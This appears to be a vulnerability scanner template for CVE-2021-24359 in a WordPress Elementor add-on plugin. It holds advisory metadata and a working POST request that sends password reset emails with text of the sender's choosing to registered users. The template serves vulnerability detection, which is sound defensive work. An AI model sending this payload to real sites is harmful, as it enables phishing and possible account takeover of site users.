id: CVE-2021-24359

info:
  name: Arbitrary Reset Password Email Sending in The Plus Addons for Elementor
  author: ProjectDiscoveryAI
  severity: medium
  description: The Plus Addons for Elementor Page Builder WordPress plugin before 4.1.11 did not properly check that a user requesting a password reset was the legitimate user, allowing an attacker to send an arbitrary reset password email to a registered user on behalf of the WordPress site. This could be chained with an open redirect to lead to an account takeover.
  impact: |
    An attacker can send arbitrary reset password emails to users, leading to potential account compromise.
  remediation: |
    Update The Plus Addons for Elementor to the latest version to mitigate CVE-2021-24359.
  reference:
    - https://wpscan.com/vulnerability/486b82d1-30d4-44d2-9542-f33e3f149e92
    - https://github.com/n0-traces/cve_monitor
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cve-id: CVE-2021-24359
    cwe-id: CWE-284,CWE-287
    epss-score: 0.00119
    epss-percentile: 0.4763
    cpe: cpe:2.3:a:posimyth:the_plus_addons_for_elementor:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: posimyth
    product: the_plus_addons_for_elementor
    framework: wordpress
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      action=theplus_ajax_forgot_password&user_login={{username}}&f_p_opt=f_p_frontend&nonce={{nonce}}&tceol[tp_cst_email_lost_opt]=yes&tceol[tp_cst_email_lost_subject]=Hey&tceol[tp_cst_email_lost_message]=Hello from my wordpress site

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Your password reset request has been sent"
        part: body
